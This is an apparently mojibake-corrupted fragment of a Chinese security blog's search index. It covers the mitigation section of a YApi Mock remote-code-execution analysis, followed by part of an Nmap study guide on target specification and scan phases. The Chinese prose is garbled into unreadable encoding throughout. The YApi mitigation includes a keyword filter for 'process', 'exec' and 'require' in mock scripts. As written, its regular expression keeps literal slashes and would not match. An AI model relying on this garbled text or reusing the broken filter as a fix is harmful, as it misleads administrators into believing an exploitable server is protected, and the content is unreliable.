ä¸è¿‡ï¼Œè¿™ä¹Ÿè¿™æ˜¯ä¸€ä¸ªè„±ç¦»ä¸šåŠ¡çš„å®‰å…¨äººå‘˜çš„ç²—æµ…æƒ³æ³•ï¼Œè¦æ ¹æ®å®é™…è¿›è¡Œå¤„ç†ã€‚ â€‹ æ„Ÿè§‰åˆæ˜¯ä¸€ä¸ªèœœç½ç´ æï¼Ÿ ","date":"2021-07-12","objectID":"/posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/:3:0","tags":["æ¼æ´åˆ†æ","vuln"],"title":"003-Yapi Mock RCE æ¼æ´å¤ç°åˆ†æ","uri":"/posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/"},{"categories":["æ¼æ´åˆ†æ"],"content":"0x04 å¨èƒæ’æŸ¥ 1ã€ä½¿ç”¨ç®¡ç†å‘˜è´¦å·ç™»å½•YAPIï¼Œåœ¨ç”¨æˆ·ç®¡ç†ä¸­æ’æŸ¥å¹¶åˆ é™¤å¼‚å¸¸ç”¨æˆ·ã€‚ 2ã€é€šè¿‡å…³é”®å­—ï¼ˆprocessã€execã€requireç­‰ï¼‰ï¼Œåœ¨adv_mocké›†åˆçš„mock_scriptåŸŸä¸­æœç´¢æ˜¯å¦å­˜åœ¨æ¶æ„çš„javascriptè„šæœ¬ã€‚ db.adv_mock.find({mock_script: /exec/}); å‡ºè‡ªï¼šã€Šã€å¤„ç½®æ‰‹å†Œã€‘YAPIè¿œç¨‹ä»£ç æ‰§è¡Œ0dayæ¼æ´ã€‹ ","date":"2021-07-12","objectID":"/posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/:4:0","tags":["æ¼æ´åˆ†æ","vuln"],"title":"003-Yapi Mock RCE æ¼æ´å¤ç°åˆ†æ","uri":"/posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/"},{"categories":["æ¼æ´åˆ†æ"],"content":"0x05 ç¼“è§£æªæ–½ ç›®å‰å®˜æ–¹æš‚æœªé’ˆå¯¹è¯¥æ¼æ´å‘å¸ƒä¿®å¤æ–¹æ¡ˆï¼Œè¯·å—å½±å“çš„ç”¨æˆ·å‚è€ƒä¸‹åˆ—æªæ–½è¿›è¡Œé˜²æŠ¤ï¼š1ã€å…³é—­YAPIç”¨æˆ·æ³¨å†ŒåŠŸèƒ½ åœ¨ config.json ä¸­æ·»åŠ ä»¥ä¸‹é…ç½®é¡¹ï¼Œç¦æ­¢ç”¨æˆ·æ³¨å†Œæˆ–å¯ç”¨LDAPè®¤è¯ï¼š { \"closeRegister\":true } ä¿®æ”¹å®Œæˆåï¼Œé‡å¯ YAPI æœåŠ¡ç”Ÿæ•ˆã€‚ 2ã€å…³é—­YAPI MockåŠŸèƒ½ 1)ã€åœ¨config.jsonä¸­æ–°å¢mock: falseå‚æ•°ï¼š { ... \"mock\": false, } 2)ã€åœ¨exts/yapi-plugin-andvanced-mock/server.jsæ–‡ä»¶ä¸­æ‰¾åˆ°ï¼š if (caseData \u0026\u0026 caseData.case_enable) {...} å¹¶æ·»åŠ ä¸‹åˆ—ä»£ç ï¼š if(!yapi.WEBCONFIG.mock) { return false; } 3ã€å¯¹é«˜çº§MockåŠŸèƒ½è¿›è¡Œå…³é”®å­—è¿‡æ»¤ åœ¨/server/utils/commons.jsæ–‡ä»¶ä¸­æ‰¾åˆ°ï¼š sandbox = yapi.commons.sandbox(sandbox, script); å¹¶æ·»åŠ ä¸‹åˆ—ä»£ç ï¼š const filter = '/process|exec|require/g'; const reg = new RegExp(filter, \"g\"); if(reg.test(script)) { return false; } 4ã€å¯¹YAPIå¹³å°çš„è®¿é—®è¿›è¡Œé™åˆ¶ åˆ©ç”¨è¯·æ±‚ç™½åå•çš„æ–¹å¼é™åˆ¶ YAPI ç›¸å…³ç«¯å£ 5ã€ä¿®æ”¹ç®¡ç†å‘˜é»˜è®¤è´¦å·å£ä»¤ï¼Œæ¸…é™¤å¼±å£ä»¤ã€‚ 6ã€æ£€æŸ¥åˆ é™¤æ¶æ„è´¦æˆ· åŠæ—¶æ£€æŸ¥åˆ é™¤æ¶æ„è´¦æˆ·ï¼ŒåŒæ­¥åˆ é™¤æ¶æ„ç”¨æˆ·åˆ›å»ºçš„æ¥å£ä»¥åŠä»–ä»¬ä¸Šä¼ çš„æ¶æ„mockè„šæœ¬ä»¥é˜²æ­¢äºŒæ¬¡æ”»å‡»ã€‚ ","date":"2021-07-12","objectID":"/posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/:5:0","tags":["æ¼æ´åˆ†æ","vuln"],"title":"003-Yapi Mock RCE æ¼æ´å¤ç°åˆ†æ","uri":"/posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/"},{"categories":["Tools"],"content":"Nmap è¿›é˜¶å­¦ä¹ å¿ƒå¾—","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/","tags":["Tools","Pentest"],"title":"002-Nmapè¿›é˜¶å­¦ä¹ å¿ƒå¾—","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"0x00 å¼• â€‹ è¯´èµ·ç«¯å£æ‰«æï¼Œä½ å¯ä»¥ä¸¾å‡ºä¸€å¤§å †çš„å·¥å…·ï¼Œä½†æœ‰ä¸€æ¬¾ç¥å™¨ï¼Œä¸€å®šæ˜¯ç™»åœºç‡æœ€é«˜çš„ï¼Œé‚£å°±æ˜¯Nmapã€‚ä½œä¸ºæœ€ä¸ºå¤§ä¼—æ‰€ç†Ÿæ‚‰çš„å·¥å…·ï¼Œç›¸ä¿¡å¤§å®¶éƒ½â€œç†Ÿç»ƒæŒæ¡â€äº†Nmapçš„ä½¿ç”¨æŠ€å·§ï¼Œæˆ‘æ›¾ç»ä¹Ÿæ˜¯é‚£ä¹ˆè®¤ä¸ºçš„ï¼Œç›´åˆ°æˆ‘çœ‹åˆ°äº†å®˜æ–¹å‡ºç‰ˆä¹¦åˆŠã€ŠNmap Network Scanningã€‹ï¼ˆç”µå­ç¨¿ï¼Œç®€ç§°NNSï¼‰ï¼Œæ‰çŸ¥é“åŸæ¥è‡ªå·±ä¸€ç›´åªæ˜¯â€œä¼šç”¨â€è€Œå·²ã€‚ â€‹ é¦–å…ˆï¼Œæˆ‘ä»¬æ¥æå‡ºä¸€äº›é—®é¢˜ï¼Œå¦‚æœèƒ½æ¸…æ¥šå›ç­”ä¸‹åˆ—é—®é¢˜ï¼Œé‚£ä¹ˆæ­å–œä½ ä¸ç”¨æµªè´¹30åˆ†é’Ÿé˜…è¯»æœ¬æ–‡äº†ï¼Œé—®é¢˜å¦‚ä¸‹ï¼š Nmapæ”¯æŒå“ªäº›åŠŸèƒ½é€‰é¡¹ï¼Ÿ Nmapçš„æ‰§è¡Œè¿‡ç¨‹æ˜¯æ€ä¹ˆæ ·çš„ï¼Ÿ Nmap åŒ…å«äº†å“ªäº›é»˜è®¤é€‰é¡¹ï¼Ÿå¦‚æ‰§è¡Œäº†å“ªäº›æ¢æµ‹æŠ€æœ¯ç­‰ Nmapæœ‰å“ªäº›ç«¯å£æ¢æµ‹æŠ€æœ¯ï¼Œæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ Nmapçš„æ‰«æé€Ÿåº¦æ…¢ä¸€ç›´è¢«äººè¯Ÿç—…ï¼Œæœ‰ä»€ä¹ˆæ–¹æ³•å¯ä»¥åŠ é€Ÿå—ï¼Ÿ â€‹ æœ‰å…³Nmapçš„æ–‡ç« ç½‘ç»œä¸Šå·²ç»å¾ˆå¤šäº†ï¼Œå¤§å¤šæ•°äººå¯èƒ½å·²ç»çœ‹è¿‡äº†ä¸å°‘äº†ï¼Œæ‰€ä»¥æœ‰äº›ç®€å•çš„åœ°æ–¹æˆ‘ä¼šä¸€ç¬”å¸¦è¿‡ï¼Œå¤§å®¶ç½‘ä¸Šæœç´¢ä¸€ä¸‹ï¼Œä¹Ÿè®¸ä¼šè·å¾—æ›´å¤šçš„çŸ¥è¯†ç¢°æ’ã€‚æ—¢ç„¶ç½‘ä¸Šæ–‡ç« é‚£ä¹ˆå¤šï¼Œæˆ‘ä¸ºä»€ä¹ˆè¿˜è¦å†™å‘¢ï¼Ÿé¦–å…ˆä¹Ÿæ˜¯ä¸»è¦ç›®çš„ï¼Œæ˜¯è®°å½•è‡ªå·±çš„å­¦ä¹ å¿ƒå¾—ï¼Œæ¨åŠ¨ä¿ƒè¿›è‡ªå·±æˆé•¿ï¼›å…¶æ¬¡æ˜¯æˆ‘å‘ç°ç½‘ä¸Šå¾ˆå¤šæ–‡ç« åªæ˜¯ç®€å•çš„åˆ—ä¸¾äº†Nmapçš„åŠŸèƒ½é€‰é¡¹ï¼Œç½—åˆ—äº†ä¸€å †å´æ²¡æœ‰æ·±å…¥å»è¯´æ˜è¿™äº›é€‰é¡¹çš„æ³¨æ„äº‹é¡¹ï¼Œå› æ­¤ä¼šé€ æˆå¾ˆå¤šçš„è¯¯è§£å’Œé”™è¯¯ä½¿ç”¨ï¼Œä¾‹å¦‚ï¼šæœ‰ä¸€ä¸ªé€‰é¡¹ -Pnï¼Œç”¨äºè·³è¿‡ä¸»æœºå‘ç°é˜¶æ®µï¼Œ é»˜è®¤ç›®æ ‡ä¸»æœºåœ¨çº¿ï¼Œæ•´ä¸ªæµç¨‹å°‘è¿›è¡Œä¸€ä¸ªé˜¶æ®µï¼Œè¿™æ ·æ‰«æé€Ÿåº¦å°±ä¼šåŠ å¿«äº†å§ï¼Ÿï¼ˆçœŸçš„ä¹ˆï¼Ÿ:Dï¼‰ï¼›è¿˜æœ‰ä¹Ÿæ˜¯ç±»ä¼¼çš„ï¼Œæœ‰äº›æ–‡ç« ç»™å‡ºäº†åº”å¯¹å„ç§åœºæ™¯çš„NmapæŒ‡ä»¤ï¼Œå¦‚æœä¸å»äº†è§£é‚£äº›æŒ‡ä»¤å°±ç›²ç›®çš„ç…§æ¬ï¼Œé‚£ä¹ˆä½ å¯èƒ½è¢«æ–‡ç« ä½œè€…çš„â€œç¬”è¯¯â€æ‰€è¯¯å¯¼ã€‚å•°å—¦äº†ä¸€å †ï¼Œæˆ‘ä»¬å¼€å§‹å§ï¼ â€‹ NmapåŠŸèƒ½é€‰é¡¹å¯ä»¥æŸ¥çœ‹ Nmap -h ï¼Œæˆ‘è¿™é‡Œå°±ä¸ä¸€æ¡æ¡å»è¯´äº†ï¼Œä¸‹æ–‡æ¶‰åŠåˆ°æ—¶å†è¯´ã€‚ ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:1:0","tags":["Tools","Pentest"],"title":"002-Nmapè¿›é˜¶å­¦ä¹ å¿ƒå¾—","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"0x01. æŒ‡å®šæ‰«æç›®æ ‡ â€‹ é¦–å…ˆï¼Œæˆ‘æ‰“ç®—ä»æœ€ç®€å•çš„Nmapçš„å‘½ä»¤æ¡ˆä¾‹è®²èµ·ï¼šnmap 192.168.1.1ã€‚é€šå¸¸ç»å¤§å¤šæ•°äººä½¿ç”¨Nmapæ—¶ï¼Œéƒ½æ˜¯éœ€è¦é’ˆå¯¹ç‰¹å®šçš„ç›®æ ‡è¿›è¡Œæ‰«æçš„ï¼Œæ‰€ä»¥å°±å…ˆæ¥è¯´è¯´NmapæŒ‡å®šæ‰«æç›®æ ‡çš„å‡ ç§æ–¹å¼ã€‚çŒœçŒœä»¥ä¸‹å“ªäº›ç›®æ ‡æ ¼å¼æ˜¯èƒ½å¤Ÿè¢«nmapè§£æçš„å‘¢ï¼Ÿ 192.168.1.1 192.168.1.2 192.168.1.1,2,3 192.168.1.1/28 192.168.1.- 192.168.2-3.1-255 192.168.1.250- 192.168.1.-20 192.168.3-5,7.1 scanme.nmap.org scanme.nmap.org/32 -.-.1.1 0-.0.255.13.37 2001:800:40:2a03::3 â€‹ ç­”æ¡ˆæ˜¯é™¤äº†-.-.1.1ä»¥å¤–ï¼Œéƒ½å¯ä»¥ä½œä¸ºç›®æ ‡è¾“å…¥ã€‚Nmapæ”¯æŒåŸŸåå½¢å¼ï¼›æ”¯æŒCIDRå¯»å€ï¼ˆä»/0å…¨ç½‘åˆ°/32å½“å‰IPï¼‰ï¼›æ”¯æŒIPv6åœ°å€ï¼Œä½†éœ€è¦æŒ‡å®šé€‰é¡¹-6æ¥å¼€å¯IPv6æ”¯æŒã€‚ â€‹ è¿å­—ç¬¦ï¼ˆ-ï¼‰è¡¨ç¤ºä»0-255ï¼Œå½“æŒ‡å®šä»0å¼€å§‹ï¼Œæˆ–åˆ°255ç»“æŸæ—¶ï¼Œå¯ä»¥çœç•¥0å’Œ255ã€‚é‚£ä¹ˆä¸ºä»€ä¹ˆ-.-.1.1ä¸å¯ä»¥å‘¢ï¼Ÿå› ä¸ºç›´æ¥ä»¥è¿å­—ç¬¦ï¼ˆ-ï¼‰å¼€å¤´ï¼ŒNmapä¼šå°†å®ƒè§†ä¸ºä¸€ä¸ªåŠŸèƒ½é€‰é¡¹è§£æï¼Œè€Œä¸æ˜¯ä½œä¸ºç›®æ ‡åœ°å€ã€‚ â€‹ Nmapåœ¨å‘½ä»¤è¡Œä¸Šå¯ä»¥åŒæ—¶æ¥å—å¤šä¸ªä¸»æœºä½œä¸ºç›®æ ‡ï¼Œè€Œä¸”ä¸è¦æ±‚æ˜¯ç»Ÿä¸€ç±»å‹çš„ï¼Œå¦‚ï¼šnmap scanme.nmap.org 192.168.0.0/8 10.0.0,1,3-7.- ï¼ˆæ³¨æ„ï¼šä¸åŒ…æ‹¬Ipv6ï¼ŒIpv6å’ŒIpv4ä¸èƒ½åŒæ—¶å¯ç”¨ï¼‰ã€‚å¤šä¸ªä¸»æœºä¹‹é—´ç”±ä¸€ä¸ªæˆ–å¤šä¸ªç©ºæ ¼åˆ†éš”ã€‚ â€‹ -iL â€‹ Nmap è¿˜æ”¯æŒä»æ–‡ä»¶åˆ—è¡¨ä¸­è¯»å–ç›®æ ‡ï¼ŒåŠŸèƒ½é€‰é¡¹ä¸º -iL ï¼ŒåŒæ ·ä¹Ÿæ”¯æŒä¸Šè¿°æ ¼å¼ï¼Œç”±ä¸€ä¸ªæˆ–å¤šä¸ªç©ºæ ¼ï¼Œåˆ¶è¡¨ç¬¦æˆ–æ¢è¡Œç¬¦åˆ†éš”ã€‚ â€‹ æ­¤å¤–Nmapè¿˜æ”¯æŒä»æ ‡å‡†è¾“å…¥ä¸­è¯»å–ç›®æ ‡ä¸»æœºåˆ—è¡¨ï¼Œå¯ä½¿ç”¨è¿å­—ç¬¦ï¼ˆ-ï¼‰ä½œä¸º -iL çš„æ–‡ä»¶åï¼Œä¾‹å¦‚ï¼š â€‹ sort -u IpList.txt | nmap -iL - â€‹ egrep'^ lease'/var/lib/dhcp/dhcpd.leases | awk'{print $ 2}'| nmap -iL- --exclude å’Œ --excludefile \u003cfilename\u003e â€‹ æ’é™¤æ‰«æç›®æ ‡æœ‰ä¸¤ä¸ªåŠŸèƒ½é€‰é¡¹ï¼š--exclude å’Œ --excludefile \u003cfilename\u003eï¼Œå¾ˆæ˜æ˜¾åè€…æ˜¯ä»æ–‡ä»¶ä¸­è¯»å–éœ€æ’é™¤çš„æ‰«æç›®æ ‡ï¼Œå°±ä¸ç»†è¯´äº†ã€‚ â€‹ è¿™é‡Œæœ‰ä¸€ä¸ªæ³¨æ„äº‹é¡¹ï¼šâ€“exclude åŠŸèƒ½é€‰é¡¹åé¢æ¥çš„å‚æ•°æ˜¯ç”¨é€—å·åˆ†éš”çš„ï¼Œå› æ­¤ä¸æ”¯æŒ192.168.1.10,20,30æ¥æŒ‡å®šæ’é™¤IP â€‹ -iR â€‹ å…¶å®ï¼Œé™¤äº†æŒ‡å®šç›®æ ‡è¿›è¡Œæ‰«æä¹‹å¤–ï¼ŒNmapè¿˜æ”¯æŒæ¼«æ— ç›®çš„çš„å…¨ç½‘æ‰«æï¼ŒåŠŸèƒ½é€‰é¡¹ä¸º-iR \u003cnumber\u003eï¼Œè¡¨ç¤ºä»å…¨ç½‘ä¸­éšæœºé€‰æ‹©æŒ‡å®š number ä¸ªä¸»æœºè¿›è¡Œæ‰«æï¼Œå¦‚æœnumberä¸º0ï¼Œè¡¨ç¤ºæŒç»­æ‰«æç›´åˆ°ç”¨æˆ·ç»ˆæ­¢ï¼Œ-iR è¿™ä¸ªåŠŸèƒ½ä¸€èˆ¬å¾ˆå°‘ä¼šç”¨åˆ°ã€‚ â€‹ -sL â€‹ å…‰çœ‹ä¸éªŒè¯å®¹æ˜“è¢«éª—ï¼Œå¦‚ä½•å¿«é€Ÿçš„éªŒè¯å‘¢ï¼Œå»è¯•ä¸€ä¸‹ -sL é€‰é¡¹å§ï¼Œå®ƒä¼šåˆ—å‡ºè¿›è¡Œæ‰«æçš„ç›®æ ‡æ¸…å•ï¼Œè€Œä¸è¿›è¡Œæ‰«æï¼Œé€šå¸¸å°±æ˜¯ç”¨äºæ’æŸ¥å¾…æ‰«æçš„ç›®æ ‡æ˜¯å¦å‡†ç¡®ã€‚ â€‹ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°IPæ®µèƒ½å¯¹ä¸Šï¼Œå¯¹åŸŸåç›®æ ‡ï¼ŒNmapè¿›è¡Œäº†åŸŸåè§£æå’Œåå‘DNSï¼Œä¸‹æ–‡å°±å°†ä»‹ç»Nmapçš„è¿è¡Œé¡ºåºäº†ã€‚ ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:2:0","tags":["Tools","Pentest"],"title":"002-Nmapè¿›é˜¶å­¦ä¹ å¿ƒå¾—","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"0x02. Nmapè¿è¡Œæµç¨‹ â€‹ Nmapçš„è¿è¡Œè¿‡ç¨‹å¯è§å®˜æ–¹æ–‡æ¡£ï¼šhttps://nmap.org/book/nmap-phases.html â€‹ ä¸€ä¸ªç®€å•çš„Nmapè¿è¡Œæµç¨‹å¯ä»¥æè¿°è¾“å…¥ã€ä¸»æœºå‘ç°ã€ç«¯å£æ‰«æã€ç‰ˆæœ¬æ¢æµ‹ã€æ“ä½œç³»ç»Ÿæ¢æµ‹ã€è¾“å‡ºï¼Œå¦‚ä¸‹å›¾ï¼š â€‹ ä¸€ä¸ªå®Œæ•´çš„Nmapæ‰«ææµç¨‹å°±æ˜¯ï¼šé¢„æ‰«æè„šæœ¬åŠ è½½ï¼Œç›®æ ‡åˆ—ä¸¾ï¼Œä¸»æœºå‘ç°ï¼ŒDNSåå‘è§£æï¼Œç«¯å£æ‰«æï¼ŒæœåŠ¡ä¸ç‰ˆæœ¬æ¢æµ‹ï¼Œæ“ä½œç³»ç»Ÿæ¢æµ‹ï¼Œç½‘ç»œè·¯ç”±ç›‘æµ‹ï¼Œè„šæœ¬æ‰«æï¼Œç»“æœè¾“å‡ºï¼Œåæ‰«æè„šæœ¬åŠ è½½ã€‚å¤§æ„å¦‚å›¾ï¼šï¼ˆå›¾æºè‡ªç½‘ç»œï¼ŒPSï¼šè¿™ç§å›¾æ˜¯æ‹¿ä»€ä¹ˆåšçš„ï¼Œæƒ³ä¿®æ”¹å‡ ä¸ªåœ°æ–¹ï¼‰ â€‹ å®Œæ•´çš„æµç¨‹å¦‚ä¸Šæ‰€ç¤ºï¼Œä½†å¾ˆå¤šæµç¨‹æä¾›äº†ç‰¹å®šçš„åŠŸèƒ½é€‰é¡¹æ¥è¿›è¡Œå¼€å¯æˆ–è·³è¿‡è¯¥é˜¶æ®µã€‚æ¥ä¸‹æ¥å°†ä»‹ç»å„ä¸ªé˜¶æ®µçš„è®¾è®¡ç›®ï¼Œå¦‚ä½•å¼€å¯/å…³é—­è¯¥é˜¶æ®µï¼Œä»¥åŠè¯¥é˜¶æ®µçš„ä¸€äº›æ³¨æ„äº‹é¡¹ã€‚ é¢„æ‰«æè„šæœ¬ï¼ˆScript pre-scanningï¼‰ï¼šä½¿ç”¨ --script æˆ– -sCåŠŸèƒ½é€‰é¡¹å¼€å¯Nmapè„šæœ¬å¼•æ“æ—¶ï¼Œå½“æŒ‡å®šçš„è„šæœ¬ä¸­å­˜åœ¨ç›¸åº”è„šæœ¬ï¼Œæ‰ä¼šæ‰§è¡Œè¿™ä¸ªé˜¶æ®µï¼Œé»˜è®¤ä¸è¿›è¡Œè¯¥é˜¶æ®µã€‚è¯¥é˜¶æ®µå®ç°çš„åŠŸèƒ½ä¸ºæŒ‡å®šè„šæœ¬çš„åŠŸèƒ½ã€‚ ç›®æ ‡æšä¸¾ï¼šè¿™ä¸ªé˜¶æ®µç”¨äºè§£æç”¨æˆ·è¾“å…¥çš„ç›®æ ‡ï¼Œå°†åŸŸåã€CIDRç­‰è§£æä¸ºIPåœ°å€ä»¥ä¾›æ‰«æï¼Œè¿™æ˜¯å¿…ä¸å¯å°‘çš„ä¸€ä¸ªé˜¶æ®µã€‚-sL -nè¾“å‡ºçš„ç»“æœå°±æ˜¯è¿™ä¸ªé˜¶æ®µçš„è¾“å‡ºç»“æœã€‚ï¼ˆ-n è¡¨ç¤ºä¸è¿›è¡Œåå‘DNSè§£æï¼‰ ä¸»æœºå‘ç°ï¼ˆpingæ‰«æï¼‰ï¼šè¯¥é˜¶æ®µç”¨äºåˆ¤æ–­æ‰€æŒ‡å®šçš„ç›®æ ‡ä¸»æœºæœ‰å“ªäº›æ˜¯åœ¨çº¿çš„ï¼ŒåŒæ—¶è¿˜ä¼šæ”¶é›†ä¸ç›®æ ‡ä¸»æœºä¹‹é—´çš„ç½‘ç»œçŠ¶å†µï¼Œç”¨äºåŠ é€Ÿåç»­çš„ç«¯å£æ‰«æã€‚è¿™ä¸ªé˜¶æ®µæ”¯æŒå¾ˆå¤šä¸»æœºå‘ç°æŠ€æœ¯ï¼Œå¹¶ä¸”æ˜¯å¤šç§æ¢é’ˆä¸€åŒå·¥ä½œã€‚è¿™ä¸ªé˜¶æ®µé»˜è®¤è¿è¡Œï¼Œå¯ä»¥ä½¿ç”¨-Pn å¯ä»¥è·³è¿‡ä¸»æœºå‘ç°é˜¶æ®µï¼Œé»˜è®¤ç›®æ ‡ä¸»æœºåœ¨çº¿ã€‚ åå‘DNSè§£æï¼šNmapä¼šé€šè¿‡pingæ‰«æå‘ç°æ‰€æœ‰åœ¨çº¿ä¸»æœºçš„åå‘DNSåç§°ï¼Œä¸»æœºåç§°å¯èƒ½æ³„éœ²è¯¥ä¸»æœºçš„åŠŸèƒ½ç”¨é€”ã€‚-nå¯ä»¥ç¦ç”¨åå‘è§£æï¼Œè€Œ -Råˆ™è¡¨ç¤ºå¯¹æ‰€æœ‰ä¸»æœºï¼ˆå³ä½¿ä¸åœ¨çº¿ï¼‰ä¹Ÿè¿›è¡Œåå‘DNSè§£æã€‚ ç«¯å£æ‰«æï¼šNmapçš„æ ¸å¿ƒåŠŸèƒ½ï¼Œç”¨äºè·å–ç«¯å£çš„å¼€æ”¾çŠ¶æ€ï¼Œæ”¯æŒå¤šç§æ‰«ææŠ€æœ¯ï¼Œä½†åŒä¸€æ—¶é—´åªèƒ½é€‰æ‹©ä¸€ç§æ‰«ææŠ€æœ¯æ¢é’ˆè¿›è¡Œæ¢æµ‹ï¼Œè¾“å‡ºç»“æœæœ‰å…­ç§ï¼šopenã€closedã€filteredã€unfilteredã€open|filteredã€closed|filteredã€‚æ³¨æ„ï¼šè¿™äº›çŠ¶æ€ä¸æ˜¯ç«¯å£æœ¬èº«çœŸå®çŠ¶æ€ï¼Œè€Œæ˜¯æè¿°Nmapå¦‚ä½•çœ‹å¾…å®ƒä»¬ã€‚ä¸åŒçš„æ‰«ææŠ€æœ¯å¾—åˆ°çš„çŠ¶æ€ä¹Ÿä¸ä¸€æ ·ï¼Œéœ€è¦å­¦ä¼šäº†è§£å…¶å«ä¹‰ã€‚é»˜è®¤æ‰§è¡Œï¼Œä½†-sn å¯ä»¥è·³è¿‡ç«¯å£æ‰«æåŠŸèƒ½ æœåŠ¡å’Œç‰ˆæœ¬æ¢æµ‹ï¼šå½“è¯†åˆ«åˆ°å¼€æ”¾çš„ç«¯å£æ—¶ï¼Œå¯å¯¹è¯¥ç«¯å£ä¸Šè¿è¡Œçš„æœåŠ¡å’Œç‰ˆæœ¬è¿›è¡Œæ¢æµ‹ã€‚ä½¿ç”¨-sVå¯ç”¨ç‰ˆæœ¬æ¢æµ‹ã€‚ æ“ä½œç³»ç»Ÿæ£€æµ‹ï¼š-O å¼€å¯ä¸»æœºæ“ä½œç³»ç»Ÿæ£€æµ‹ã€‚æ³¨æ„ï¼šæ“ä½œç³»ç»Ÿæ£€æµ‹åˆ°çš„ç³»ç»Ÿå¯èƒ½ä¸ç‰ˆæœ¬æ¢æµ‹é˜¶æ®µæ‰«æåˆ†æå¾—å‡ºçš„ç³»ç»Ÿä¸ä¸€è‡´ï¼Œèƒ½çŒœåˆ°æ˜¯ä¸ºä»€ä¹ˆå—ï¼Ÿ ç½‘ç»œè·¯ç”±ç›‘æµ‹ï¼ˆTracerouteï¼‰ï¼š--traceroute é€‰é¡¹å¼€å¯è¯¥åŠŸèƒ½ã€‚å®ƒå¯ä»¥ä½¿ç”¨ä¹‹å‰é˜¶æ®µç¡®å®šçš„æœ€ä½³å¯ç”¨æ¢æµ‹æ•°æ®åŒ…ï¼Œæ‰¾åˆ°å¹¶è¡Œåˆ°è¾¾å¤šä¸ªä¸»æœºçš„ç½‘ç»œè·¯ç”±ã€‚Traceroute é€šå¸¸æ¶‰åŠä¸­é—´ä¸»æœºçš„å¦ä¸€è½®åå‘ DNS è§£æã€‚ è„šæœ¬æ‰«æï¼šNmapè„šæœ¬å¼•æ“ï¼ˆNSEï¼‰ä¸­çš„è„šæœ¬å¤§éƒ¨åˆ†è¿è¡Œåœ¨è¿™ä¸€é˜¶æ®µã€‚ä½¿ç”¨ --script æˆ–-sCç­‰é€‰é¡¹å¯ç”¨æ­¤åŠŸèƒ½ã€‚Nmapæ”¯æŒ6ç§ç±»å‹çš„è„šæœ¬ï¼ŒåŒæ—¶è¿˜å…è®¸é«˜ç«¯ç©å®¶æ ¹æ®éœ€æ±‚è‡ªå·±ç¼–å†™è„šæœ¬ï¼ŒæŒæ¡Nmap è„šæœ¬æ‰©å±•å¼€å‘æ˜¯å¾ˆæœ‰å¸®åŠ©çš„ã€‚ ç»“æœè¾“å‡ºï¼šè¿™ä¸€é˜¶æ®µNmapä¼šå°†å…¶æ”¶é›†åˆ°çš„æ‰€æœ‰ä¿¡æ¯å†™å…¥å±å¹•æˆ–æ–‡ä»¶ã€‚æ”¯æŒå¤šç§æ ¼å¼è¾“å‡ºï¼Œé»˜è®¤æ˜¯è¾“å‡ºåˆ°å±å¹•ã€‚ åæ‰«æè„šæœ¬ï¼ˆScript post-scanningï¼‰ï¼šåœ¨ Nmap å®Œæˆæ‰«æå’Œæ­£å¸¸è¾“å‡ºåï¼Œæ­¤é˜¶æ®µçš„è„šæœ¬å¯ä»¥å¤„ç†ç»“æœå¹¶æä¾›æœ€ç»ˆæŠ¥å‘Šå’Œç»Ÿè®¡ä¿¡æ¯ã€‚é»˜è®¤ä¸åŒ…å«ä»»ä½•è„šæœ¬ï¼Œä¹Ÿå°±ç›¸å½“äºé»˜è®¤ä¸è¿›è¡Œè¿™ä¸ªé˜¶æ®µï¼Œåªæœ‰åœ¨ç”¨æˆ·åŒ…å«å¹¶æ‰§è¡Œä»–ä»¬è‡ªå·±çš„æ‰«æåè„šæœ¬æ—¶æ‰ä¼šè¿è¡Œã€‚åŒæ ·ä¹Ÿæ˜¯ä½¿ç”¨ --script ç­‰é€‰é¡¹å¯ç”¨ã€‚ ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:3:0","tags":["Tools","Pentest"],"title":"002-Nmapè¿›é˜¶å­¦ä¹ å¿ƒå¾—","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"0x03. é»˜è®¤çš„é€‰é¡¹æŠ€æœ¯ â€‹ Nmap é»˜è®¤çš„é€‰é¡¹æŠ€æœ¯ï¼Œè¿™é‡Œæˆ‘ä»¬è¿˜æ˜¯ç”¨ nmap 192.168.1.1/24 ä¸ºä¾‹åˆ†æï¼Œåœ¨ä¸Šæ–‡äº†è§£å®Œè¿è¡Œæµç¨‹ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“è¿™æ¡å‘½ä»¤åŒ…å«äº†ç›®æ ‡åˆ—ä¸¾ã€ä¸»æœºå‘ç°ã€åå‘DNSè§£æã€ç«¯å£æ‰«æå’Œç»“æœè¾“å‡ºè¿™ä¹ˆ5ä¸ªé˜¶æ®µã€‚ 